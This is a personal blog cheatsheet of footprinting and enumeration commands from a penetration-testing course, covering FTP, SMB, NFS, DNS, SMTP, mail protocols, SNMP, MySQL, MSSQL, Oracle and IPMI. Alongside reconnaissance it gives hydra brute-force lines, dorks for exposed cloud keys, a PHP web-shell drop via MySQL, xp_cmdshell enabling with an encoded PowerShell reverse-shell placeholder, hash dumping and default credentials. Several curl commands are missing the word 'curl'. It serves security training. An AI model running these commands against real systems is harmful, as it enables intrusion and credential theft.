---
title: Footprinting theory + cheatsheet
date: 2025-03-16 1:00:00 + 05:30
categories: [Enumeration]
tags: [nmap, cpts, oscp]    # TAG names should always be lowercase
description: Footprinting common services
---
# Footprinting common services
![](/assets/images/footprinting.png)
## This post covers footprinting techniques from the CPTS course along with my cheatsheet for common enumeration methods.
## Infrastructure Based Enumeration
### Domain Information

#### Finding Valid Subdomains

```bash
openssl s_client -connect example.com:443 -showcerts
```

https://crt.sh/ 

crt.sh is a public database of SSL certificates. You can search for a domain to see all associated subdomains.

View results in JSON
```bash
 -s https://crt.sh/\?q\=example.com\&output\=json | jq .
```

Using Nmap and NSE to retrieve ssl information
```bash
nmap --script ssl-cert -p 443 example.com
```
Querying DNS records
```bash
dig any inlanefreight.com
```
DNS record types:

1. A Record (Address Record) – Maps a domain name to an IPv4 address so computers know where to find a website.
2. MX Record (Mail Exchange) – Specifies which mail servers handle email for a domain.
3. NS Record (Name Server) – Points to the DNS servers responsible for managing a domain’s records.
4. TXT Record (Text Record) – Stores extra information, often for verification (e.g., SPF for email security or site ownership proof).

### Cloud Resources
#### Google dorks for finding Cloud resources 

AWS S3 Buckets
```
site:s3.amazonaws.com "companyname"
inurl:".s3.amazonaws.com" filetype:xml
```

Azure Blob Storage
```
site:blob.core.windows.net "companyname"
```

Google Cloud Storage (GCS) Buckets
```
site:storage.googleapis.com "companyname"
```
Publicly Indexed Environment Files (May Contain Cloud Keys)
```
filetype:env "AWS_ACCESS_KEY_ID" OR "AZURE_STORAGE_KEY" OR "GOOGLE_CLOUD_PROJECT"
```
Exposed Log Files
```
filetype:log "password" OR "secret"
```
#### Third party tools for enumerating Cloud resources

https://domain.glass/

Domain.glass is a tool that aggregates DNS records and subdomains

https://buckets.grayhatwarfare.com/

GrayHatWarfare is a search engine that indexes publicly exposed cloud storage buckets from AWS, Azure, and GCP. It can be used to find files left open to the internet.

## Host Based Enumeration
### FTP - File Transfer Protocol - Port 21

```bash
ftp <IP>
```

Enter anonymous when prompted for Username to login anonymously (if anonymous login is enabled). 

Recursive listing
```bash
ftp> ls -R
```

Download file
```bash
ftp> get <filename>
```

Upload file
```bash
ftp> put <filename>
```
Exit
```bash
ftp> exit
```
Download All Available Files
```bash
wget -m --no-passive ftp://username:password@<IP>
```
If the password has special characters (@, :, !, etc.), URL-encode them.

Use debug/trace for detailed output

Debug
```bash
ftp> debug
```

Trace
```bash
ftp> trace
```
Using nmap scipts
```bash
locate *.nse | grep ftp
```
Using these scripts
```bash
nmap --script "ftp-*" -p 21 <IP>
```
Interacting with FTP with TLS/SSL enabled
```bash
openssl s_client -connect 10.129.14.136:21 -starttls ftp
```

### SMB - Server Message Block - Port 445 / 139
Enumerating shares
```bash
smbclient -N -L //<IP>
```

Connecting to share
```bash
smbclient //<IP>/<sharename>
```
list files
```bash
smb: \> ls
```
download file
```bash
smb: \> get <filename>
```
Using nmap scipts
```bash
locate *.nse | grep smb
```
Using these scripts
```bash
nmap --script "smb-*" -p 21 <IP>
```
Using rpcclient for enumeration. -U "" is for null authentication. Enter username if credentials are available.
```bash
rpcclient -U "" <IP>
```
RPCClient - Server Information
```bash
rpcclient $> srvinfo
```
RPCClient - Enumerate domains on the network
```bash
rpcclient $> enumdomains
```
RPCClient - Get domain, server and user information
```bash
rpcclient $> querydominfo
```
RPCClient - Enumerate all shares
```bash
rpcclient $> netshareenumall
```
RPCClient - Get information about a specific share
```bash
rpcclient $> netsharegetinfo <share>
```
RPCClient - Enumerate domain users
```bash
rpcclient $> enumdomusers
```
RPCClient - Query a specific user
```bash
rpcclient $> queryuser <RID>
```
RPCClient - Query a specific group
```bash
rpcclient $> querygroup <>
```
Brute Forcing User RIDs with script
```bash
for i in $(seq 500 1100);do rpcclient -N -U "" <IP> -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
```
Brute Forcing User RIDs with Impacket
```bash
samrdump.py <IP>
```
Enumeration with SMBmap
```bash
smbmap -H <IP>
```
Using Enum4Linux-ng
```bash
./enum4linux-ng.py <IP> -A
```
#### Using NetExec
Enumerating shares
```bash
nxc smb <IP> -u '' -p '' --shares
```
Enumerating users through RID Bruteforcing
```bash
nxc smb <IP> -u '' -p '' --rid-brute
```
Enumerating Password policy
```bash
nxc smb <IP> -u '' -p '' --pass-pol
```
Enumerating Local groups
```bash
nxc smb <IP> -u '' -p '' --local-group
```
### NFS - Network File Share - Port 111 / 2049

Using nmap scipts
```bash
locate *.nse | grep nfs
```
Using these scripts
```bash
sudo nmap --script nfs* <IP> -sV -p111,2049
```
Show available NFS Share
```bash
showmount -e <IP>
```
Mounting NFS Share
```bash
mkdir target-NFS
sudo mount -t nfs <IP>:/ ./target-NFS/ -o nolock
cd target-NFS
```
-o nolock is used to prevent issues with NFS file locking in certain environments.

List Contents with Usernames & Group Names
```bash
ls -l target-NFS/
```
List Contents with UIDs & GUIDs
```bash
ls -n target-NFS/
```
Unmounting file share
```bash
cd ..
sudo umount ./target-NFS
```
### DNS - Domain Name System - Port 53

Domain Name System (DNS) is responsible for mapping domain names to IP addresses. It consists of several server types:

| Server Type       | Description |
|----------------------|---------------|
| DNS Root Server   | Handles top-level domains (TLDs), last-resort query resolution. |
| Authoritative Nameserver | Holds the official records for a specific domain. |
| Non-authoritative Nameserver | Caches DNS records from authoritative sources. |
| Caching DNS Server | Temporarily stores DNS query results. |
| Forwarding Server | Passes queries to another DNS server. |
| Resolver | Resolves DNS queries locally (in routers, computers, etc.). |

---

#### Common DNS Record Types

| DNS Record | Description |
|--------------|---------------|
| A       | Maps a domain to an IPv4 address. |
| AAAA    | Maps a domain to an IPv6 address. |
| MX      | Specifies mail servers for the domain. |
| NS      | Identifies name servers for a domain. |
| TXT     | Stores arbitrary text data (e.g., SPF, DKIM, DMARC validation). |
| CNAME   | Creates an alias for another domain name. |
| PTR     | Reverse lookup: maps an IP to a domain name. |
| SOA     | Contains zone information and admin email. |


#### DNS Enumeration Commands

Find Name Servers
```bash
dig ns <target-domain>
host -t ns <target-domain>
```

Retrieve All DNS Records
```bash
dig any <target-domain>
host -a <target-domain>
```

Enumerate a Specific Record Type
```bash
dig <record-type> <target-domain>
host -t <record-type> <target-domain>
```
Examples:
```bash
dig mx example.com    # Find mail servers
dig txt example.com   # Find TXT records
dig soa example.com   # Find SOA record
```
Reverse Lookup (PTR Record)
```bash
dig -x <IP>
host <IP>
```
Perform Zone Transfer (AXFR)
```bash
dig axfr <target-domain> @<dns-server>
```
Find Subdomains via Certificate Transparency Logs
```bash
 -s "https://crt.sh/?q=<target-domain>&output=json" | jq .
```
#### Brute-Force Subdomains
Using SecLists:
```bash
for sub in $(cat /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt); do
  dig $sub.<target-domain> @<dns-server> | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt
done
```
Using `dnsenum`:
```bash
dnsenum --dnsserver <dns-server> --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt <target-domain>
```
#### DNS Enumeration with Nmap
Locate DNS NSE Scripts
```bash
locate *.nse | grep dns
```
Run DNS Enumeration Scripts
```bash
nmap --script "dns-*" -p 53 <target-domain>
```
### SMTP - Simple Mail Transfer Protocol - Port 25 / 465 / 587
#### Understanding SMTP
Simple Mail Transfer Protocol (SMTP) is used for sending emails between clients and servers. It operates mainly on the following ports:

| Port | Usage |
|---------|-----------|
| 25  | Default SMTP port (often blocked for outbound mail). |
| 465 | Secure SMTP (SMTPS) using SSL/TLS encryption. |
| 587 | SMTP with STARTTLS (modern encryption standard). |

SMTP is often used in combination with POP3 (Port 110) or IMAP (Port 143) to receive emails.

#### Common SMTP Commands

| Command | Description |
|------------|---------------|
| HELO/EHLO | Initiates a session with the SMTP server. |
| MAIL FROM | Specifies the sender's email address. |
| RCPT TO | Specifies the recipient’s email address. |
| DATA | Signals the start of email body transmission. |
| VRFY | Checks if an email address exists (User Enumeration). |
| EXPN | Expands a mailing list to show all recipients. |
| RSET | Aborts the current email transaction. |
| NOOP | Keeps the connection open without performing any action. |
| QUIT | Terminates the session. |

Note: Many modern SMTP servers disable VRFY and EXPN due to security concerns. If disabled, consider alternative enumeration techniques (e.g., brute-force or metadata analysis).

#### SMTP Enumeration Commands

Banner Grabbing
```bash
nc -nv <IP> 25
telnet <IP> 25
```
- Reveals the SMTP server version and potential misconfigurations.

Example Output:
```
220 mail.example.com ESMTP Postfix
```

Find Available SMTP Commands
```bash
ehlo example.com
```
- Lists supported commands like `VRFY`, `EXPN`, `STARTTLS`, etc.

Enumerate Valid Users
Using VRFY (If Allowed)
```bash
vrfy root
vrfy admin
vrfy user123
```
- If the user exists, the server responds with "252 2.0.0 <username>".

Using EXPN (Expands Mailing Lists)
```bash
expn admin
expn users
expn mailinglist
```
- May return a full list of emails if enabled.

Brute-Force User Enumeration with SMTP
```bash
for user in $(cat users.txt); do 
  echo "VRFY $user" | nc -nv <IP> 25;
done
```

Sending Emails via SMTP
Connect to SMTP Server
```bash
telnet <IP> 25
```

Start a Mail Session
```bash
HELO example.com
MAIL FROM: <attacker@example.com>
RCPT TO: <victim@example.com>
DATA
```

Write and Send Email
```plaintext
Subject: Test Email
This is a test email sent via SMTP enumeration.

.
QUIT
```
- The `.` (dot) on a new line signifies the end of the message.


#### Checking for Open Relays (Misconfigurations)
An open relay allows anyone to send emails without authentication, often leading to spam and phishing attacks.

Test Open Relay with Telnet
```bash
MAIL FROM: <attacker@example.com>
RCPT TO: <victim@anydomain.com>
DATA
Subject: Open Relay Test
This is a test email.

.
QUIT
```
- If accepted, the server is an open relay, allowing unauthorized emails.

Use Nmap to Check for Open Relay
```bash
nmap --script smtp-open-relay -p 25 <IP>
```

Example Output:
```
smtp-open-relay: Server is an open relay (16/16 tests)
```

Locate SMTP NSE Scripts
```bash
locate *.nse | grep smtp
```
Run Common SMTP Enumeration Scripts
```bash
nmap --script "smtp-*" -p 25,465,587 <IP>
```
#### Using SMTP User Enum
```bash
smtp-user-enum -M VRFY -U users.txt -t <IP>
```
If VRFY is disabled, hydra can be used to brute-force credentials.
```bash
hydra -L users.txt -P passwords.txt -s 25 -S <IP> smtp
```
### IMAP / POP3 - Internet Message Access Protocol - Post Office Protocol - Port 143 / 993 / 110 / 995
#### Understanding IMAP & POP3
IMAP (Internet Message Access Protocol) and POP3 (Post Office Protocol) are used to retrieve emails from a mail server.

| Protocol | Port | Usage |
|-------------|--------|----------------------------|
| IMAP | 143 | Retrieves emails while keeping them on the server. |
| IMAPS (IMAP Secure) | 993 | IMAP over SSL/TLS encryption. |
| POP3 | 110 | Retrieves emails and removes them from the server. |
| POP3S (POP3 Secure) | 995 | POP3 over SSL/TLS encryption. |

#### Common IMAP Commands

| Command | Description |
|------------|---------------|
| `1 LOGIN <username> <password>` | Authenticates the user. |
| `1 LIST "" *` | Lists all available mail directories. |
| `1 CREATE "INBOX"` | Creates a new mailbox. |
| `1 DELETE "INBOX"` | Deletes a mailbox. |
| `1 SELECT INBOX` | Selects a mailbox for reading messages. |
| `1 FETCH <ID> all` | Retrieves all data associated with an email message. |
| `1 CLOSE` | Removes all messages marked as deleted. |
| `1 LOGOUT` | Terminates the session with the IMAP server. |

#### Common POP3 Commands

| Command | Description |
|------------|---------------|
| `USER <username>` | Identifies the user. |
| `PASS <password>` | Authenticates the user. |
| `STAT` | Displays the number of emails in the mailbox. |
| `LIST` | Lists all emails with their size. |
| `RETR <ID>` | Retrieves an email message by ID. |
| `DELE <ID>` | Deletes an email by ID. |
| `RSET` | Resets the mailbox state. |
| `QUIT` | Terminates the session with the POP3 server. |

#### IMAP & POP3 Enumeration Commands

Scan for IMAP & POP3 Services
```bash
nmap -sV -p110,143,993,995 <IP>
```
- Detects Dovecot, Exchange, or other mail services.
- Shows SSL certificates and mail server details.

Extract IMAP/POP3 Capabilities
```bash
openssl s_client -connect <IP>:143 -starttls imap
openssl s_client -connect <IP>:110 -starttls pop3
```
- Reveals supported authentication mechanisms.
- Shows TLS/SSL configurations.

Brute-Force IMAP & POP3 Credentials
Using `hydra`:
```bash
hydra -L users.txt -P passwords.txt imap://<IP> -V
hydra -L users.txt -P passwords.txt pop3://<IP> -V
```
- Attempts to log in using username/password lists.

Access Mailbox with ``
```bash
 -k 'imaps://<IP>' --user <user>:<password>
```
or
```bash
 -k --url "imaps://<IP>/INBOX" --user <user>:<password>
```
- Lists email folders upon successful authentication.

Enumerate Mailbox via IMAP
```bash
openssl s_client -connect <IP>:993
```
Then interact using:
```plaintext
1 LOGIN <user> <password>
1 LIST "" *
1 SELECT INBOX
1 FETCH 1 all
```
- Fetches email messages and metadata.

Enumerate Mailbox via POP3
```bash
openssl s_client -connect <IP>:995
```
Then interact using:
```plaintext
USER <user>
PASS <password>
STAT
LIST
RETR 1
```
- Retrieves email content from the server.

Using Nmap Scripts for IMAP and POP3

```bash
locate *.nse | grep imap
locate *.nse | grep pop3
```
```bash
nmap --script "imap-*" -p 143,993 <IP>
nmap --script "pop3-*" -p 110,995 <IP>
```
### SNMP - Simple Network Management Protocol - Port 161 / 162
#### Understanding SNMP
Simple Network Management Protocol (SNMP) is used for monitoring and managing network devices like routers, switches, servers, and IoT devices.  
It operates on:
- UDP 161 for requests.
- UDP 162 for receiving SNMP traps (unsolicited alerts from devices).

#### Discover SNMP Services
```bash
nmap -sU -p 161 --script=snmp-info <IP>
```
Extract SNMP System Information (Default Community Strings). Retrieves system info, usernames, installed software, and more.
```bash
snmpwalk -v2c -c public <IP>
snmpwalk -v1 -c public <IP>
```
Bruteforce Community Strings
```bash
onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt <IP>
```
Query a Specific OID
```bash
snmpget -v2c -c public <IP> .1.3.6.1.2.1.1.1.0
```
Enumerate SNMP Users (SNMPv3)
```bash
snmpwalk -v3 -u <username> -l authPriv -A <password> -X <encryption_key> -a SHA -x AES <IP>
```
Extract Running Processes, Dump Installed Software, Extracts local user accounts
```bash
snmpwalk -v2c -c public <IP> .1.3.6.1.2.1.25.4.2.1.2
```
Brute-Force SNMP OIDs
```bash
braa public@<IP>:.1.3.6.*
```
Using Nmap scrips
```bash
locate *.nse | grep snmp
```
```bash
nmap --script "snmp-*" -p 161 <IP>
```
### MySQL - Relational Database Management System - Port 3306

Using nmap scripts
```bash
sudo nmap <IP> -sV -sC -p3306 --script mysql*
```

Connect to mysql
```bash
mysql -u <Username> -p<Password> -h <IP>
```

See available databases
```bash
MySQL [(none)]> show databases;
``` 
See DB Version
```bash
MySQL [(none)]> select version();
```
Select database
```bash
SQL [(none)]> use mysql;
```
Enumerate tables
```bash
MySQL [mysql]> show tables;
```
Enumerate tables
```bash
MySQL [mysql]> show tables;
```
Show columns in a selected dataset
```bash
MySQL [mysql]> show columns from <table>;
```
Show all information in a table
```bash
MySQL [mysql]> select * from <table>;
```
Search for needed string in the desired table.
```bash
MySQL [mysql]> select * from <table> where <column> = "<string>";
```

Bruteforcing credentials with hydra
```bash
hydra -L users.txt -P passwords.txt -s 3306 -f <IP> mysql
```

If we have file write permissions, we can drop a PHP shell:
```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
```
### MSSQL - Microsoft SQL Server - Port 1433
##### Scanning for MSSQL Services
```bash
nmap -p 1433 --script ms-sql-* <IP>
```

If you have valid credentials, you can connect and enumerate the databases:

```bash
python3 mssqlclient.py <Username>:<password>@<IP>
```
List databases after connecting:
```bash
SQL> select name from sys.databases;
```
Check current user privileges:
```sql
SELECT IS_SRVROLEMEMBER('sysadmin');   -- Check if user is sysadmin
SELECT IS_SRVROLEMEMBER('db_owner');   -- Check if user is database owner
SELECT IS_SRVROLEMEMBER('db_datareader'); -- Check if user can read all tables
SELECT IS_SRVROLEMEMBER('db_datawriter'); -- Check if user can modify data
```
If 1 is returned, you have the respective privilege.

If xp_cmdshell is enabled, you can execute system commands:
```sql
EXEC xp_cmdshell 'whoami';
```
If xp_cmdshell is disabled, we can enable it:
```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```
#### Basic MSSQL Enumeration
List all databases
```sql
SELECT name FROM master.sys.databases;
```
Switch to a database
```sql
USE <database_name>;
```
List all tables in the current database
```sql
SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;
```
List all columns in a specific table
```sql 
SELECT COLUMN_NAME, DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'Users';
```
List all stored procedures
```sql
SELECT name FROM sys.procedures;
```
Check MSSQL version
```sql
SELECT @@VERSION;
```

Revshell from xp_cmdshell
Get Base64 payload from http://revshells.com/
```sql
EXEC xp_cmdshell 'powershell -enc BASE64_PAYLOAD';
```

### Oracle TNS - Transparent Network Substrate - Port 1521
#### Scanning for Oracle TNS Services
```bash
nmap -p 1521 --script oracle-tns-version <IP>
```
Brute-force Oracle SIDs:
```bash
nmap --script oracle-sid-brute -p 1521 <IP>
```
Scan for known vulnerabilities:
```bash
nmap -p 1521 --script oracle-vuln-* <IP>
```

#### Oracle Enumeration with ODAT
ODAT (Oracle Database Attacking Tool) is useful for enumeration and exploitation.
```bash
git clone https://github.com/quentinhardy/odat.git
cd odat/
pip3 install -r requirements.txt
```
Check if the target is properly configured:
```bash
./odat.py all -s <IP>
```
Find valid credentials:
```bash
./odat.py passwordguesser -s <IP> -d XE -U users.txt -P passlist.txt
```
#### Brute-forcing Oracle Credentials
Using Hydra:
```bash
hydra -L users.txt -P passwords.txt <IP> oracle-listener
```

#### Connecting to Oracle Database
Using SQLPlus:
```bash
sqlplus <username>/<password>@<IP>/<SID>
```
Example:
```bash
sqlplus <USERNAME>/<PASSWORD>@<TARGET_IP>/<DATABASE_SID>
```
Connecting as SYSDBA:
```bash
sqlplus <USERNAME>/<PASSWORD>@<TARGET_IP>/<DATABASE_SID> as sysdba
```

#### Enumerate Database Information
List databases:
```sql
SELECT name FROM v$database;
```
List tables in current database:
```sql
SELECT table_name FROM all_tables;
```
List user privileges:
```sql
SELECT * FROM user_role_privs;
```
Extract password hashes:
```sql
SELECT name, password FROM sys.user$;
```

#### Exploiting Oracle Database
##### Uploading a File to the Server
Upload a test file:
```bash
echo "Test Upload" > test.txt
./odat.py utlfile -s <IP> -d XE -U <username> -P <password> --sysdba --putFile C:\\inetpub\\wwwroot test.txt ./test.txt
```
Check if file upload was successful:
```bash
curl -X GET http://<IP>/test.txt
```

### IPMI - Intelligent Platform Management Interface - Port 623
#### Scanning for IPMI Services
```bash
nmap -sU -p 623 --script ipmi-* <IP>
```
Using Metasploit:
```bash
use auxiliary/scanner/ipmi/ipmi_version
set rhosts <IP>
run
```

#### Default Credentials to Try

| Product         | Username   | Password                 |
|----------------|-----------|--------------------------|
| Dell iDRAC     | root      | calvin                   |
| HP iLO        | Administrator | 8-character random string |
| Supermicro IPMI | ADMIN     | ADMIN                    |

#### Bruteforce IPMI Credentials
```bash
hydra -L users.txt -P passwords.txt <IP> ipmi -V
```

#### Dumping IPMI Password Hashes
Using Metasploit:
```bash
use auxiliary/scanner/ipmi/ipmi_dumphashes
set rhosts <IP>
run
```

#### Cracking IPMI Hashes with Hashcat
```bash
hashcat -m 7300 ipmi_hashes.txt rockyou.txt --force
```
### This is not complete yet. I plan to add more stuff about Remote management protocols and detailed explanation of things I havent totally understood next week.